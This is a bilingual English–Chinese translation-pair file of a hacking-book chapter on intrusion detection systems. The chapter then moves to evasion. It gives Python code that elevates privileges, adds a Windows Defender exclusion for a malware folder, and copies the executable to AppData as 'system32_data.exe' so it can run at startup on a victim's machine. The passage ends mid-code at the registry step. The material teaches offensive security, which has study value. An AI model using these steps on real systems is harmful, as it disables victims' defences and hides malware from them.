- en: '*Chapter 9*: System Protection and Perseverance'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第九章*：系统保护与持久化'
- en: 'In this chapter, we are going to focus our attention on how defense mechanisms
    work and by understanding how they work, you can learn what techniques you can
    use to bypass them. We will start by learning about intrusion detection systems
    and their different types. After that, we will learn about detection mechanisms.
    Once we understand these mechanisms, we will try to bypass them using our tools.
    In summary, this chapter will focus on the following topics:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们将重点关注防御机制是如何工作的，通过了解它们的工作原理，您可以学习到如何使用哪些技术来绕过它们。我们将从了解入侵检测系统及其不同类型开始。然后，我们将学习检测机制。一旦我们理解了这些机制，我们将尝试使用我们的工具来绕过它们。总之，本章将集中讨论以下主题：
- en: System protection
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 系统保护
- en: Intrusion detection methods
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 入侵检测方法
- en: Detection mechanisms
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 检测机制
- en: Bypassing IDSes
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绕过 IDS
- en: Persistence system protection
  id: totrans-6
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 持久化系统保护
- en: Our previous chapters focused on creating malware and carrying out different
    attacks. This is the offensive side of attacks. However, in real-life hacking,
    you need to know how to protect yourself against external attacks. A better understanding
    of protection mechanisms would help you to not only protect yourself, but this
    knowledge would also help you to carry out successful attacks. The first line
    of defense against external network attacks, or system attacks in general, is
    the **Intrusion Detection System** (**IDS**). IDS is an umbrella term for a lot
    of tools used for system security and protection, so we must learn about them
    in detail.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 我们之前的章节集中在创建恶意软件和执行不同的攻击上。这是攻击的进攻性一面。然而，在真实的黑客攻击中，您需要知道如何保护自己免受外部攻击。更好地理解保护机制不仅有助于您保护自己，而且这种知识还将帮助您成功地进行攻击。对外部网络攻击或系统攻击的第一道防线通常是**入侵检测系统**（**IDS**）。IDS
    是用于系统安全和保护的各种工具的总称，因此我们必须详细了解它们。
- en: Intrusion detection systems
  id: totrans-8
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 入侵检测系统
- en: 'IDSes are a system that monitor and detect the components of your network or
    system on a continuous basis to detect any undesirable or suspicious behavior.
    The goal of an IDS is to prevent any undesirable scenario in a system. Fundamentally,
    there are three types of IDS:'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: IDS 是一个持续监控并检测网络或系统组件的系统，用于检测任何不良或可疑的行为。IDS 的目标是防止系统中出现任何不良的情况。从根本上说，IDS 有三种类型：
- en: Host-based IDSes
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 主机基础的 IDS
- en: Network-based IDSes
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网络基础的 IDS
- en: Hybrid IDSes
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 混合型 IDS
- en: Let's discuss these in detail in the following sections.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们在接下来的章节中详细讨论这些内容。
- en: Host-based IDSes
  id: totrans-14
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 主机基础的 IDS
- en: Host-based IDSes run on the system they are monitoring. Along with other software,
    host-based IDSes monitor the filesystem to scan for any potentially harmful files.
    They also monitor and analyze network traffic to see whether any malicious traffic
    is occurring over the network.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 主机基础的 IDS 在它们所监控的系统上运行。与其他软件一起，主机基础的 IDS 会监控文件系统，扫描潜在的有害文件。它们还会监控和分析网络流量，以查看网络中是否有恶意流量。
- en: Host-based IDSes are an important part of a system's security apparatus; however,
    they often do not give complete details regarding the security state of the system.
    They can be modified and even bypassed by different attacks. An important aspect
    of a host-based IDS is how up to date it is in terms of modern threat detection.
    It should constantly keep up with the modern threats and block them immediately
    if it detects them. An important feature of a host-based IDS is to keep a log
    of all critical activities occurring on a system. This can help a lot in threat
    detection and incidence response.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 主机基础的 IDS 是系统安全机制的重要组成部分；然而，它们通常无法提供有关系统安全状态的完整细节。它们可能会被不同的攻击修改甚至绕过。主机基础 IDS
    的一个重要方面是它在现代威胁检测方面的更新频率。它应该不断跟进现代威胁，并在发现时立即阻止它们。主机基础 IDS 的一个重要特点是保留所有关键活动的日志。这对威胁检测和事件响应非常有帮助。
- en: On most common OSes, you have some sort of host-based IDS already built in.
    In a Windows OS, Windows built-in antivirus is part of the host IDS. It monitors
    and detects any suspicious activity on the system and blocks potential threats
    from acting on a system. Along with virus detection, it also works to detect any
    tampering of critical Windows infrastructure.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 在大多数常见的操作系统中，您已经有某种主机基础的 IDS 内置在系统中。在 Windows 操作系统中，Windows 内置的杀毒软件是主机 IDS 的一部分。它监控并检测系统上的任何可疑活动，并阻止潜在的威胁对系统进行攻击。除了病毒检测外，它还会检测任何对关键
    Windows 基础设施的篡改。
- en: Network-based IDSes
  id: totrans-18
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 网络基础的 IDS
- en: Another important aspect of system security is network-based protection. Network-based
    IDSes play a key role in limiting external network attacks from taking place.
    They play a role in protecting all devices present in a network. It observes network
    traffic over the whole subnet to monitor suspicious activity. It can be combined
    with firewalls to provide additional security. Sometimes, network-wide firewalls
    are part of an IDS.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 系统安全的另一个重要方面是基于网络的保护。基于网络的IDS在限制外部网络攻击的发生中发挥着关键作用。它们在保护网络中所有设备方面起着作用。它通过监控整个子网的网络流量来观察可疑活动。它可以与防火墙结合使用，以提供额外的安全性。有时，网络范围内的防火墙也是IDS的一部分。
- en: Hybrid IDSes
  id: totrans-20
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 混合型IDS
- en: As the name suggests, these detection systems provide much more security for
    the system as compared with individual systems. They combined both system-based
    and network-based approaches to catch malicious behavior and have a much higher
    rate of detection. Modern hybrid IDSes use both conventional and **artificial
    intelligence** (**AI**)-based techniques to prevent network attacks.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 正如名称所示，与单独的系统相比，这些检测系统为系统提供了更多的安全性。它们结合了基于系统和基于网络的方法来捕捉恶意行为，并具有更高的检测率。现代混合型IDS使用常规技术和基于**人工智能**（**AI**）的技术来防止网络攻击。
- en: Now that we have learned about different types of IDS, let's see how these IDSes
    work.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了不同类型的IDS，让我们看看这些IDS是如何工作的。
- en: IDS detection mechanisms
  id: totrans-23
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: IDS检测机制
- en: Most common IDSes work by using the following two fundamental techniques, although
    modern IDSes use much more sophisticated approaches. Let's take a look at different
    detection mechanisms and how they are used in real systems.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 最常见的IDS通过使用以下两种基本技术来工作，尽管现代的IDS使用了更加复杂的方法。让我们来看看不同的检测机制以及它们如何在实际系统中应用。
- en: Signature-based detection
  id: totrans-25
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 基于特征码的检测
- en: 'This is a classical knowledge-based approach and has been used since the early
    days of computer security. In this approach, the protection software has access
    to a large known database of malware. Using the database, it can see what bytes
    are present in the malware, and then it simply compares any new file introduced
    to the system with this byte sequence. If the byte sequence of an *unknown file*
    matches with the byte sequence present in the database, this means that the unknown
    file is most probably malicious, and it will immediately block this file. Otherwise,
    it will continue with normal operations. The algorithm looks like this in its
    simplest form:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一种经典的基于知识的方法，自计算机安全的早期阶段以来就已经使用。在这种方法中，保护软件可以访问一个大型的已知恶意软件数据库。通过这个数据库，它可以查看恶意软件中存在哪些字节，然后它简单地将任何新引入系统的文件与这些字节序列进行比较。如果一个*未知文件*的字节序列与数据库中存在的字节序列匹配，则意味着该未知文件很可能是恶意的，它将立即阻止该文件。否则，它将继续正常操作。其算法最简单的形式如下：
- en: '![Figure 9.1 – Signature-based detection mechanism'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: '![图9.1 – 基于特征码的检测机制'
- en: '](image/B14788_09_01.jpg)'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_01.jpg)'
- en: Figure 9.1 – Signature-based detection mechanism
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.1 – 基于特征码的检测机制
- en: Signature-based detection works great for known malware, so a good IDS must
    have a larger malware database. This method is only going to be as good as the
    database it has for testing. Newly written malware that has not yet been detected
    will give a false negative for this test.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 基于特征码的检测对于已知的恶意软件非常有效，因此一个好的IDS必须拥有更大的恶意软件数据库。此方法的效果仅取决于它所拥有的数据库的质量。如果是新编写的恶意软件尚未被检测到，那么在该测试中会产生假阴性。
- en: Anomaly-based detection
  id: totrans-31
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 基于异常的检测
- en: These detection systems work differently to the signature-based approach. They
    monitor the activities that a program undertakes. It defines certain scenarios
    that it regards as *normal behavior* and then looks for any anomaly in these behaviors.
    For example, a game software should not try to disable the antivirus system. Once
    a malware program tries to do something it is not supposed to, these systems flag
    these programs as suspicious and keep monitoring them until they detect that a
    program is trying to perform something it absolutely shouldn't. Once it detects
    suspicious behavior, it would either block the program altogether or generate
    a *red alert* for the administrator.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 这些检测系统与基于特征码的方法不同。它们监控程序的活动，定义某些它认为是*正常行为*的场景，然后寻找这些行为中的任何异常。例如，一个游戏软件不应该试图禁用防病毒系统。一旦恶意软件程序试图做一些不应该做的事情，这些系统就会将这些程序标记为可疑，并继续监控它们，直到检测到该程序试图执行一些绝对不该做的操作。一旦检测到可疑行为，它们要么会完全阻止该程序，要么会为管理员生成*红色警报*。
- en: Note that there is a small difference between IDSes and **Intrusion Prevention
    Systems** (**IPSes**). For practical purposes, most of the time, these tasks are
    performed by the same piece of software and we don't make any practical distinction
    between them. Occasionally, however, you will see that IDSes and IPSes are mentioned
    separately, so you should know the difference between them.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，IDS和**入侵防御系统**（**IPS**）之间有一个小的区别。实际上，大多数情况下，这些任务是由同一软件完成的，我们通常不做实际区分。然而，偶尔你会看到IDS和IPS被单独提及，所以你应该了解它们之间的区别。
- en: Now that we have learned what an IDS is and how it works, we can start building
    a program to learn how to bypass these systems.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了什么是IDS以及它是如何工作的，我们可以开始构建一个程序，学习如何绕过这些系统。
- en: Bypassing an IDS
  id: totrans-35
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过IDS
- en: In [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130), *Malware Development*,
    and [*Chapter 7*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152), *Advanced Malware*,
    we developed our malware program, and in [*Chapter 8*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160),
    *Post Exploitation*, we learned how to package our malware into a trojan. Our
    malware works great and most probably will not be detected by the IDS if it is
    using a signature-based approach since the malware is written by you and no signature
    exists for your program anywhere. However, modern IDSes are quite clever and after
    a couple of runs, they will start noting suspicious behaviors for which they use
    very exhaustive methods. In this section, we will try to see how we can run our
    Python executable and administrator privileges. This will help to achieve certain
    tasks on the victim's machine that a *normal* executable will not be able to do.
    For example, disabling the antivirus program on Windows, or creating an exception
    for a certain folder so that the virus scanner doesn't scan it, requires administrator
    privileges in Windows. You can't perform activities such as this with a normal
    executable.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 在[*第6章*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)，《恶意软件开发》和[*第7章*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152)，《高级恶意软件》中，我们开发了我们的恶意软件程序，而在[*第8章*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160)，《后渗透》中，我们学习了如何将恶意软件打包成木马。我们的恶意软件工作得很好，如果IDS使用基于签名的方法，它很可能不会被检测到，因为恶意软件是你自己编写的，且没有任何签名存在于任何地方。然而，现代IDS相当聪明，经过几次运行后，它们会开始注意到可疑行为，并使用非常详尽的方法进行分析。在这一节中，我们将尝试看看如何以管理员权限运行我们的Python可执行文件。这将有助于在受害者的机器上执行某些任务，而普通的可执行文件无法完成。例如，在Windows中禁用防病毒程序，或者为某个文件夹创建例外，使得病毒扫描程序不扫描该文件夹，都需要管理员权限。你无法通过普通的可执行文件完成这些操作。
- en: Let's see first how we can run an executable with *administrator privileges*.
    You can use this method in combination with your malware program. However, for
    the sake of simplicity, I will use a simple Python script to demonstrate this
    procedure.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们首先看看如何以*管理员权限*运行可执行文件。你可以将这种方法与恶意软件程序结合使用。然而，为了简便起见，我将使用一个简单的Python脚本来演示这个过程。
- en: Let's create a new Python script. Create a new virtual environment as well.
    There are multiple ways to elevate privileges for a Python program and you will
    find multiple solutions online. However, the simplest solution I have found is
    to use a library called **elevate**. Since we will be creating an executable for
    demo purposes, let's install **pyinstaller** as well.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们创建一个新的Python脚本，并创建一个新的虚拟环境。提升Python程序权限的方法有很多，你可以在网上找到多种解决方案。然而，我找到的最简单解决方案是使用一个叫做**elevate**的库。由于我们将创建一个可执行文件进行演示，所以我们也需要安装**pyinstaller**。
- en: 'Once you have created a new project and installed **pyinstaller** in the virtual
    environment, let''s run the following line to download the **elevate** Python
    module:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你创建了一个新项目并在虚拟环境中安装了**pyinstaller**，我们可以运行以下命令来下载**elevate** Python模块：
- en: pip install elevate
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: pip install elevate
- en: Once this package is installed, you can use it inside your code to increase
    privileges for your executable. In my experience, I have found out that it is
    a good idea to put this functionality at the start of your script to get the best
    results. To elevate privileges for the script, you can simply call the **elevate**
    function from this module.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦安装了这个包，你可以在代码中使用它来提升可执行文件的权限。根据我的经验，我发现最好将这个功能放在脚本的开头，这样可以获得最佳效果。要提升脚本的权限，你只需调用该模块中的**elevate**函数。
- en: 'Let''s try to first see what the *user privilege* level is before we use this
    module. Simply write the following code to test. We can use the **os** module
    to check for root privileges:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们首先看看*用户权限*级别，在使用此模块之前。只需写出以下代码进行测试。我们可以使用**os**模块来检查是否拥有 root 权限：
- en: import ctypes
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: import ctypes
- en: import platform
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: import platform
- en: 'def is_root():'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 'def is_root():'
- en: 'if platform.system() == "Windows":'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 'if platform.system() == "Windows":'
- en: return ctypes.windll.shell32.IsUserAnAdmin()
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: return ctypes.windll.shell32.IsUserAnAdmin()
- en: 'else:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: return 1
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: return 1
- en: print(is_root())
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: print(is_root())
- en: 'You can use the preceding code to see whether the program is running in elevated
    mode. If the value returned by the previous code is **1**, this means it is being
    run as an *administrator*, otherwise it is running in non-administrator mode.
    Let''s run the previous program to see the execution mode:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用前面的代码来查看程序是否在提升模式下运行。如果前面的代码返回的值是**1**，则表示它以*管理员*身份运行，否则它是在非管理员模式下运行。让我们运行之前的程序来查看执行模式：
- en: '![Figure 9.2 – No administrator privileges'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.2 – 没有管理员权限'
- en: '](image/B14788_09_02.jpg)'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_02.jpg)'
- en: Figure 9.2 – No administrator privileges
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.2 – 没有管理员权限
- en: 'Now, to elevate, you can simply call the **elevate()** method. Note that there
    is a small caveat in how privilege escalation works in Windows. When a call to
    **elevate()** is made, instead of running the same script as *administrator*,
    Windows restarts the same script as a separate process with higher privileges.
    There is no workaround for this yet. So, when the call to elevate is made, a new
    process will start. Let''s begin by elevating privileges:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，为了提升权限，你可以直接调用**elevate()**方法。请注意，Windows 在处理权限提升时有一个小小的限制。当调用**elevate()**时，Windows
    并不是以*管理员*身份运行相同的脚本，而是重新启动脚本并以更高的权限作为一个独立进程运行。对此尚无解决方法。因此，当调用提升权限时，会启动一个新的进程。让我们开始提升权限：
- en: import ctypes
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: import ctypes
- en: import platform
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: import platform
- en: import time
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: import time
- en: from elevate import elevate
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: from elevate import elevate
- en: 'def is_root():'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 'def is_root():'
- en: 'if platform.system() == "Windows":'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 'if platform.system() == "Windows":'
- en: return ctypes.windll.shell32.IsUserAnAdmin()
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: return ctypes.windll.shell32.IsUserAnAdmin()
- en: 'else:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 'else:'
- en: return 1
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: return 1
- en: print(is_root())
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: print(is_root())
- en: elevate()
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: elevate()
- en: print(is_root())
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: print(is_root())
- en: 'Let''s now create an executable, (as we did in [*Chapter 8*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160),
    *Post Exploitation*, in the *Packaging malware* section) as well to see all of
    this in action. To run the program, double-click on the executable created. You
    will see the following popup asking the user to click **Yes** to escalate privileges.
    If the user clicks **Yes**, the program will run in administrator mode:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们创建一个可执行文件（就像我们在[*第 8 章*](B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160)，*利用后操作*一节的*打包恶意软件*部分中所做的那样），以便看到这一切的实际效果。要运行该程序，请双击创建的可执行文件。你会看到以下弹出窗口，要求用户点击**是**以提升权限。如果用户点击**是**，程序将以管理员模式运行：
- en: '![Figure 9.3 – UAC (user account control) popup'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.3 – UAC（用户账户控制）弹出窗口'
- en: '](image/B14788_09_03.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_03.jpg)'
- en: Figure 9.3 – UAC (user account control) popup
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.3 – UAC（用户账户控制）弹出窗口
- en: 'Press **Yes** and you will see the following screen, indicating that a new
    process has been created and is running with higher privileges, indicated by **1**:'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 点击**是**，你将看到以下屏幕，表示一个新的进程已经被创建并以更高的权限运行，权限提升的标志为**1**：
- en: '![Figure 9.4 – Admin privileges'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.4 – 管理员权限'
- en: '](image/B14788_09_04.jpg)'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_04.jpg)'
- en: Figure 9.4 – Admin privileges
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.4 – 管理员权限
- en: Now that we have learned how to run our script as an *administrator*, let's
    see how we can modify Windows settings to add exceptions to the IDS scanning.
    We will add a directory to the Windows exception rules. This will allow us to
    skip virus scanning for a certain directory and will help us to plant malware
    in that directory.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经学会了如何以*管理员*身份运行脚本，让我们看看如何修改 Windows 设置来添加 IDS 扫描的例外。我们将把一个目录添加到 Windows
    的例外规则中。这将允许我们跳过某个目录的病毒扫描，并帮助我们在该目录中植入恶意软件。
- en: 'The complete code to elevate privileges is present at the following link: [https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py).'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 提升权限的完整代码可以在以下链接查看：[https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py](https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py)。
- en: 'In the previous program, we first elevate privileges and then add an exception
    to the folder where our malware is present in Windows defender settings. This
    will skip the scanning of the current folder. The following code achieves this:
    **objective.d**:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 在之前的程序中，我们首先提升权限，然后在Windows Defender设置中添加对存放恶意软件的文件夹的排除项。这样就可以跳过当前文件夹的扫描。以下代码实现了这一功能：**objective.d**：
- en: command = "Add-MpPreference -ExclusionPath " + dir_to_add
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: command = "Add-MpPreference -ExclusionPath " + dir_to_add
- en: all_commands.append(command)
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: all_commands.append(command)
- en: 'The previous line adds an exception to the Microsoft Defender scanning repositories,
    as shown in the following screenshot:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 前一行将一个排除项添加到Microsoft Defender扫描库中，如下截图所示：
- en: '![Figure 9.5 – Added exclusion for virus scanning'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.5 – 添加病毒扫描排除项'
- en: '](image/B14788_09_05.jpg)'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_05.jpg)'
- en: Figure 9.5 – Added exclusion for virus scanning
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.5 – 添加病毒扫描排除项
- en: Now we know how to make our program run in stealth mode and avoid detection
    by an IDS. Next, we will add persistence to our program. This will allow our program
    to run when Windows starts up so that a user doesn't have to click on the malware
    program every time in order for us to have a reverse connection. The victim will
    only click on the malware once and we will add a Windows registry key for the
    start up program so that every time the computer is started, our malware program
    will run. You can use this method on the victim program we developed earlier.
    Here, for the sake of simplicity, I will just use a demo script.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道如何让程序在隐身模式下运行，避免被IDS检测到。接下来，我们将为程序添加持久性。这样，程序就能在Windows启动时自动运行，用户无需每次点击恶意程序就能建立反向连接。受害者只需点击一次恶意程序，我们将为启动程序添加一个Windows注册表键，这样每次电脑启动时，我们的恶意程序就会运行。你可以将此方法应用到我们之前开发的受害者程序中。为了简化起见，我将只使用一个演示脚本。
- en: Persistence
  id: totrans-86
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 持久性
- en: 'In this section, we will learn how to run our Python script when starting up
    Windows. Let''s create a new project. You can also modify the victim program that
    we developed earlier in [*Chapter 6*](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130),
    *Malware Development*, and [*Chapter 7*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152),
    *Advanced Malware*. To add persistence to our program, we need to know exactly
    the name of the executable we are running. Once we know the executable, we can
    make a copy of this executable somewhere else and run it from there every time
    the system boots. This sounds complicated, so let''s take a look at it bit by
    bit. First, we will need to know the name of the executable. To find this out,
    let''s write the following code:'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一节中，我们将学习如何在Windows启动时运行Python脚本。让我们创建一个新项目。你也可以修改我们之前开发的受害者程序，见[**第6章**](B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130)，*恶意软件开发*，和[**第7章**](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152)，*高级恶意软件*。要为程序添加持久性，我们需要确切知道正在运行的可执行文件名称。一旦知道了可执行文件的名称，我们就可以将其复制到其他位置，并确保每次系统启动时从那里运行它。这听起来有点复杂，所以我们一步步来看。首先，我们需要知道可执行文件的名称。为此，让我们编写如下代码：
- en: import sys
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: import sys
- en: curr_executable = sys.executable
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: curr_executable = sys.executable
- en: 'print("Current executable : ", curr_executable)'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: print("当前可执行文件：", curr_executable)
- en: 'The output of the aforementioned program if you run it as a Python script would
    be as follows:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你以Python脚本的形式运行上述程序，输出将如下所示：
- en: '![Figure 9.6 – Current interpreter name'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.6 – 当前解释器名称'
- en: '](image/B14788_09_06.jpg)'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_06.jpg)'
- en: Figure 9.6 – Current interpreter name
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.6 – 当前解释器名称
- en: 'This only tells us the name of the Python interpreter and not the name of the
    executable that we need. Why is that? Because we are only running a script at
    the moment. The only way to get the actual name of the executable when we run
    the file as a binary executable is by using **pyinstaller**. Create a binary executable
    and run the executable by double-clicking it. Take a look at the following screenshot:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 这只告诉我们Python解释器的名称，而不是我们所需的可执行文件名称。为什么会这样呢？因为我们目前只是运行一个脚本。获取实际可执行文件名称的唯一方法是使用**pyinstaller**。创建一个二进制可执行文件，并通过双击运行它。请看下面的截图：
- en: '![Figure 9.7 – Actual executable name'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 9.7 – 实际的可执行文件名称'
- en: '](image/B14788_09_07.jpg)'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_09_07.jpg)'
- en: Figure 9.7 – Actual executable name
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.7 – 实际的可执行文件名称
- en: You can see that now we are getting the actual executable name that we need.
    The next step is to create a copy of this executable and store it somewhere else
    so that it is hidden from the victim and finally add a registry to the start up
    applications.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到，现在我们已经得到了实际需要的可执行文件名称。下一步是创建此可执行文件的副本并将其存储在其他位置，以便从受害者那里隐藏它，最后将注册表项添加到启动应用程序中。
- en: 'We will copy this executable to the **AppData** folder on Windows, which is
    a special folder that contains application data. To get the path of the **appdata**
    folder, you can write the following code:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将把这个可执行文件复制到 Windows 的**AppData**文件夹，这是一个包含应用程序数据的特殊文件夹。要获取**appdata**文件夹的路径，可以写以下代码：
- en: app_data = os.getenv("APPDATA")
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: app_data = os.getenv("APPDATA")
- en: 'Let''s rename the executable so it doesn''t look suspicious. We will call this
    executable **system32_data.exe**. This is a made-up name and you can use any name
    you want:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 我们来给可执行文件重命名，这样它就不会显得可疑。我们将此可执行文件命名为**system32_data.exe**。这是一个虚构的名字，你可以使用任何你想要的名称：
- en: to_save_file = app_data +"\\"+"system32_data.exe"
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: to_save_file = app_data +"\\"+"system32_data.exe"
- en: 'Next, copy the current executable to **appdata** and rename it. We will need
    to import the **shutil** module from the Python standard library:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，将当前的可执行文件复制到**appdata**文件夹并重命名它。我们需要从 Python 标准库导入**shutil**模块：
- en: shutil.copyfile(curr_executable, to_save_file)
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: shutil.copyfile(curr_executable, to_save_file)
- en: 'To add it to the Windows registry at startup, you need to run the following
    code:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 若要将其添加到 Windows 启动时的注册表中，你需要运行以下代码：
- en: key = winreg.HKEY_CURRENT_USER
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: key = winreg.HKEY_CURRENT_USER
